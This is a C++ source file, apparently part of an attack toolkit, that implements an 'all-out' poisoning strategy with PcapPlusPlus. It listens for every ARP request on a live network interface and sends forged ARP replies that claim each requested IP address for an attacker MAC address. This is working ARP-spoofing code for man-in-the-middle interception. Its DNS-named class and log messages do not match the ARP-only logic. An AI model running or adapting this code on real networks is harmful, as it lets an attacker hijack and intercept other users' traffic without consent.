#include "dns_poisoning/all_out.h"
#include "ArpLayer.h"
#include "EthLayer.h"
#include "MacAddress.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "RawPacket.h"
#include "log.h"
#include <future>
#include <stdexcept>

void ATK::DNS::AllOutDnsPoisoningStrategy::onPacketArrives(
    pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void * /*cookie*/) {
    // currently unused, no termination condition
    // auto *completionFuture = static_cast<std::promise<void> *>(cookie);

    pcpp::Packet parsedPacket(packet);
    auto *requestEthLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
    auto *requestArpLayer = parsedPacket.getLayerOfType<pcpp::ArpLayer>();

    if (requestEthLayer == nullptr || requestArpLayer == nullptr) {
        LOG_ERROR(
            "Invalid filter configuration, found packet with missing layers");
        throw std::runtime_error(
            "Invalid filter configuration, found packet with missing layers");
    }

    // determine whether or not to handle packet
    if ((requestEthLayer->getSourceMac() == device->getMacAddress() ||
         requestEthLayer->getSourceMac() == attackerMac_) ||
        requestArpLayer->getTargetIpAddr() == device->getIPv4Address()) {
        LOG_INFO("skipped packet");
        return;
    }

    // craft response packet
    pcpp::EthLayer responseEthLayer(device->getMacAddress(),
                                    requestEthLayer->getSourceMac());

    pcpp::ArpLayer responseArpLayer(pcpp::ArpOpcode::ARP_REPLY, attackerMac_,
                                    requestArpLayer->getSenderMacAddress(),
                                    requestArpLayer->getTargetIpAddr(),
                                    requestArpLayer->getSenderIpAddr());

    pcpp::Packet responsePacket(DNS_PACKET_SIZE);
    responsePacket.addLayer(&responseEthLayer);
    responsePacket.addLayer(&responseArpLayer);
    responsePacket.computeCalculateFields();

    if (!device->sendPacket(&responsePacket)) {
        device->stopCapture();
        LOG_ERROR("Failed to send packet");
        throw std::runtime_error("Failed to send packet");
    };
}

void ATK::DNS::AllOutDnsPoisoningStrategy::execute() {
    if (!device_->open()) {
        throw std::runtime_error("Unable to open device");
    }
    std::promise<void> completionPromise;
    std::future completionFuture = completionPromise.get_future();

    pcpp::ArpFilter arpFilter(pcpp::ArpOpcode::ARP_REQUEST);
    pcpp::EtherTypeFilter etherTypeFilter(PCPP_ETHERTYPE_ARP);
    pcpp::AndFilter andFilter{};
    andFilter.addFilter(&arpFilter);
    andFilter.addFilter(&etherTypeFilter);

    if (!device_->setFilter(andFilter)) {
        device_->close();
        LOG_ERROR("Unable to set DNS and ethertype filters on interface");
        throw std::runtime_error(
            "Unable to set DNS and ethertype filters on interface");
    };
    if (!device_->startCapture(
            [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                   void *cookie) { onPacketArrives(packet, device, cookie); },
            &completionFuture)) {
        device_->close();

        LOG_ERROR("Unable to start capturing DNS packets");
        throw std::runtime_error("Unable to start capturing DNS packets");
    };

    completionFuture.wait();

    device_->close();
}
